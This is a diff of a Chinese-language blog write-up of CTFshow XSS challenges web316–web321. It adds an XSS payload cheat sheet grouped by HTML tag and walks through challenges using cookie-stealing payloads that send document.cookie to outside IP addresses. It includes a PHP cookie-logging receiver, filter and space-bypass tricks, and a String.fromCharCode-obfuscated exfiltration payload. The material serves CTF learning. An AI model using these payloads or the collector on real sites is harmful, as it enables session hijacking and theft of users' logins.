@@ -1798,20 +1798,180 @@
 <li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本“XSS”。</li>
 </ul>
 <p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
-<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119182822162.png" alt="image-20241119182822162"></p>
+<h2 id="0x05xss常见标签语句"><a href="#0x05xss常见标签语句" class="headerlink" title="0x05xss常见标签语句"></a>0x05xss常见标签语句</h2><h3 id="0x01-标签"><a href="#0x01-标签" class="headerlink" title="0x01&lt;a&gt; 标签"></a>0x01&lt;a&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-标签"><a href="#0x02-标签" class="headerlink" title="0x02. &lt;img&gt;标签"></a>0x02. &lt;img&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-标签"><a href="#0x03-标签" class="headerlink" title="0x03. &lt;iframe&gt;标签"></a>0x03. &lt;iframe&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-标签"><a href="#0x04-标签" class="headerlink" title="0x04. &lt;audio&gt; 标签"></a>0x04. &lt;audio&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-标签"><a href="#0x05-标签" class="headerlink" title="0x05. &lt;video&gt;标签"></a>0x05. &lt;video&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-标签"><a href="#0x06-标签" class="headerlink" title="0x06. &lt;svg&gt; 标签"></a>0x06. &lt;svg&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-标签"><a href="#0x07-标签" class="headerlink" title="0x07. &lt;button&gt; 标签"></a>0x07. &lt;button&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x08-标签"><a href="#0x08-标签" class="headerlink" title="0x08. &lt;div&gt;标签"></a>0x08. &lt;div&gt;标签</h3><p>这个需要借助url编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x09-标签"><a href="#0x09-标签" class="headerlink" title="0x09. &lt;object&gt;标签"></a>0x09. &lt;object&gt;标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x10-标签"><a href="#0x10-标签" class="headerlink" title="0x10. &lt;script&gt; 标签"></a>0x10. &lt;script&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x11-标签"><a href="#0x11-标签" class="headerlink" title="0x11. &lt;p&gt; 标签"></a>0x11. &lt;p&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x12-标签"><a href="#0x12-标签" class="headerlink" title="0x12. &lt;input&gt; 标签"></a>0x12. &lt;input&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x13-标签"><a href="#0x13-标签" class="headerlink" title="0x13. &lt;details&gt;标签"></a>0x13. &lt;details&gt;标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x14-标签"><a href="#0x14-标签" class="headerlink" title="0x14. &lt;select&gt; 标签"></a>0x14. &lt;select&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x15-标签"><a href="#0x15-标签" class="headerlink" title="0x15. &lt;form&gt; 标签"></a>0x15. &lt;form&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x16-标签"><a href="#0x16-标签" class="headerlink" title="0x16. &lt;body&gt; 标签"></a>0x16. &lt;body&gt; 标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="#反射性xss"></a>#反射性xss</h3><p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119182822162.png" alt="image-20241119182822162"></p>
 <p>反射性XSS</p>
-<p>这道题的话我们输入最经典的xss语句试一下</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>这道题的话我们输入最经典的xss语句试一下</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="解析语句alert-‘XSS’"><a href="#解析语句alert-‘XSS’" class="headerlink" title="解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;"></a>解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;</h3><p>提供的内容是一个JavaScript脚本，其中包含了一个弹窗警告（alert），用于展示一个包含‘XSS’文字的弹窗。</p>
-<p>插入后发现有弹窗显示xss，查看源代码的时候也看到xss语句成功插入，证明我们的xss语句被成功插入并解析</p>
+<h4 id="解析语句alert-‘XSS’"><a href="#解析语句alert-‘XSS’" class="headerlink" title="解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;"></a>解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;</h4><p>提供的内容是一个JavaScript脚本，其中包含了一个弹窗警告（alert），用于展示一个包含‘XSS’文字的弹窗。</p>
+<p>插入后发现有弹窗显示xss，查看源代码的时候也看到web页面源代码有xss语句，证明我们的xss语句被成功插入并解析</p>
 <p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119192443556.png" alt="image-20241119192443556"></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241119203014705.png" alt="image-20241119203014705"></p>
-<p>这里可以看到需要admin权限</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://156.238.233.87&#x27;</span>/<span class="number">1.</span>php?<span class="number">1</span>=<span class="string">&#x27;+document.cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的话是相当于x自己了，我们拿到的是我们自己用户访问页面时候的cookie，但是这里可以看到需要admin权限</p>
+<p>所以我们需要的是管理员admin访问这个页面时候的cookie，那我们怎么去拿到admin的cookie呢?</p>
+<p>这时候就需要我们在web页面中插入xss语句来实现这个功能了</p>
+<h3 id="payload1-document-location-href"><a href="#payload1-document-location-href" class="headerlink" title="payload1:document.location.href"></a>payload1:document.location.href</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss语句</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://[ip]/xss.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>解析一下</p>
+<ol>
+<li><code>&lt;script&gt;</code>：这是HTML中用于嵌入JavaScript代码的标记。</li>
+<li><code>document.location.href</code> 是 JavaScript 中用于获取当前页面的 URL 地址的属性，通过 <code>document.location.href</code> 可以获取当前页面的完整 URL，包括协议、域名、端口、路径以及查询参数等信息。这个属性通常用于获取当前页面的 URL，并且可以用来跳转到其他页面。</li>
+<li>后面的<a href="http://xxx就是远端服务器的ip地址或者xss平台的域名,这样将会导致浏览器重定向到指定url(`http//xxx/1.php?1=%60%EF%BC%89%E5%B9%B6%E4%B8%94%E9%99%84%E5%B8%A6%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E7%9A%84">http://xxx就是远端服务器的ip地址或者xss平台的域名，这样将会导致浏览器重定向到指定URL（`http://xxx/1.php?1=`）并且附带当前页面的</a> cookie 信息</li>
+</ol>
+<p>攻击的原理是，当用户浏览包含这段恶意脚本的网页时，浏览器会执行这段JavaScript代码，将用户的cookie信息发送到指定的恶意网站</p>
+<p>知道了攻击原理，我们需要另外创建一个php文件去执行后面这个1&#x3D;’+document.cookie的功能</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将xss语句插入网站后就可以等admin去访问网站了，访问之后就可以在服务器的网页目录中看到有cookie.txt文件，里面就有管理员的cookie啦</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120120352350.png" alt="image-20241120120352350"></p>
+<p>这里也可以看出后台是会有管理员进行定时的一个访问的，不然这题没法做了</p>
+<h3 id="payload2-window-open"><a href="#payload2-window-open" class="headerlink" title="payload2:window.open"></a>payload2:window.open</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://118.31.168.198:39543/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>window.open()</code> 方法用于打开一个新窗口或标签页，并加载指定的 URL并包含当前页面的cookie信息</p>
+<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><h3 id="过滤script标签"><a href="#过滤script标签" class="headerlink" title="#过滤script标签"></a>#过滤script标签</h3><p>一样的页面，题目提示说开始过滤，我们正常插入xss语句进去试试</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现并没有弹窗，也没有生成正常的回显，猜测是script被过滤了导致无法插入页面</p>
+<p>我们看看有没有其他标签可以代替的</p>
+<h3 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h3><p>`<body>&#96; 标签是 HTML 文档结构中的一个重要标签，用来定义网页的主体部分</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 页面内容放在这里 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;body&gt;</code> 标签常见属性：</p>
+<ul>
+<li><code>background</code>：指定页面背景的图片或颜色。</li>
+<li><code>text</code>：指定页面中文本的颜色。</li>
+<li><code>link</code>：指定未被访问链接的颜色。</li>
+<li><code>alink</code>：指定激活链接时的颜色。</li>
+<li><code>vlink</code>：指定已访问链接的颜色。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&quot;</span><span class="attr">http:</span>//[<span class="attr">ip</span>]/<span class="attr">xss.php</span>?<span class="attr">cookie</span>=<span class="string">&quot;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xss.php文件的内容是不变的，都可以用来接受cookie</p>
+<h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><p>&lt;iframe&gt; 标签是在 HTML 中用来嵌入另一个 HTML 页面的标签</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;嵌入页面的URL&quot;</span> <span class="attr">width</span>=<span class="string">&quot;宽度&quot;</span> <span class="attr">height</span>=<span class="string">&quot;高度&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;边框显示方式&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见属性</p>
+<ul>
+<li><code>src</code>：指定要嵌入的页面的 URL 地址。</li>
+<li><code>width</code>：指定 iframe 的宽度。</li>
+<li><code>height</code>：指定 iframe 的高度。</li>
+<li><code>frameborder</code>：指定是否显示 iframe 的边框。可以设置为 <code>1</code> 表示显示边框，<code>0</code> 表示隐藏边框。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?cookie=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://118.31.168.198:39543/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个 <code>&lt;iframe&gt;</code> 标签中，使用了 <code>onload</code> 事件。<code>onload</code> 事件在 <code>&lt;iframe&gt;</code> 内部的页面加载完成后被触发。</p>
+<h3 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h3><p><img> 标签是在 HTML 中用来插入图片的标签</p>
+<p>语法</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片路径&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;替代文本&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见属性</p>
+<ul>
+<li><code>src</code>：指定要显示的图片的 URL 地址。</li>
+<li><code>alt</code>：用于指定图片的替代文本，当图片无法显示时会显示替代文本。这对于可访问性很重要，也有利于 SEO。</li>
+<li><code>width</code>：指定图片的宽度。</li>
+<li><code>height</code>：指定图片的高度。</li>
+<li><code>title</code>：提供一个关于图片的额外信息，通常当鼠标悬停在图片上时显示。</li>
+<li><code>style</code>：用于指定样式属性，如宽度、高度、边框等。</li>
+<li><code>class</code>：用于指定 CSS 类，可以通过 CSS 样式表来定义图片的样式。</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">οnerrοr</span>=<span class="string">location.href</span>=<span class="string">&quot;&quot;</span><span class="attr">http:</span>//[<span class="attr">ip</span>]/<span class="attr">xss.php</span>?<span class="attr">cookie</span>=<span class="string">&quot;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码中利用了 <code>onerror</code> 事件。当浏览器无法加载指定的图片时（由于 <code>src</code> 属性中的路径为空），会触发 <code>onerror</code> 事件。</li>
+</ul>
+<p>不过好像我用img标签打不出来，看到别人的wp都打出来了，应该是环境问题</p>
+<p>这几个标签都是可以替代script的，其写法上会有些许不同</p>
+<h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><h3 id="增加标签过滤"><a href="#增加标签过滤" class="headerlink" title="#增加标签过滤"></a>#增加标签过滤</h3><p>一个个试试</p>
+<p>&lt;img alert(1)&gt;输入发现没有回显</p>
+<body>alert(1)</body>输入发现有回显
+
+<p>那我们试一下body标签</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://[ip]/xss.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120123544602.png" alt="image-20241120123544602"></p>
+<p>这里可以看到有flag了，第一个应该是我自己访问了这个网站拿到的我自己的cookie</p>
+<h2 id="web320-321"><a href="#web320-321" class="headerlink" title="web320-321"></a>web320-321</h2><h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="#绕过空格"></a>#绕过空格</h3><p>先输入这个试试</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候注意看url的参数，发现空格不见了</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120145254131.png" alt="image-20241120145254131"></p>
+<p>我们再加个空格试试</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span> =<span class="string">&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120145329147.png" alt="image-20241120145329147"></p>
+<p>这下可以确定空格是被过滤了的，我们这时候就需要绕过空格了</p>
+<p>绕过空格的姿势在rce里面有很多，我们试试行不行</p>
+<h3 id="绕过空格姿势"><a href="#绕过空格姿势" class="headerlink" title="绕过空格姿势"></a>绕过空格姿势</h3><p>&#x2F;**&#x2F;</p>
+<p>&#x2F;</p>
+<p>tab(%09)</p>
+<h3 id="额外的payload"><a href="#额外的payload" class="headerlink" title="额外的payload:"></a>额外的payload:</h3><h4 id="js中String-fromCharCode-方法"><a href="#js中String-fromCharCode-方法" class="headerlink" title="js中String.fromCharCode()方法"></a>js中String.fromCharCode()方法</h4><p>ascii码转字符</p>
+<p>在不断查找wp之后我发现了这个函数也能用来打payload</p>
+<p>用它我可以构造一个payload：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String.fromCharCode(***)`就是`&lt;script&gt;document.location.href=&#x27;http://120.46.41.173/Jay17/127.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里放两个脚本</p>
+<h4 id="字符串转ascii码脚本"><a href="#字符串转ascii码脚本" class="headerlink" title="字符串转ascii码脚本"></a>字符串转ascii码脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)  <span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">ascii_list = []</span><br><span class="line"><span class="comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">    ascii_code = <span class="built_in">ord</span>(char)  <span class="comment"># 使用ord()函数获取字符的ASCII码</span></span><br><span class="line">    ascii_list.append(<span class="built_in">str</span>(ascii_code))  <span class="comment"># 将ASCII码转换为字符串并添加到列表</span></span><br><span class="line"><span class="comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span></span><br><span class="line">result = <span class="string">&#x27;,&#x27;</span>.join(ascii_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的ASCII码:&quot;</span>, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
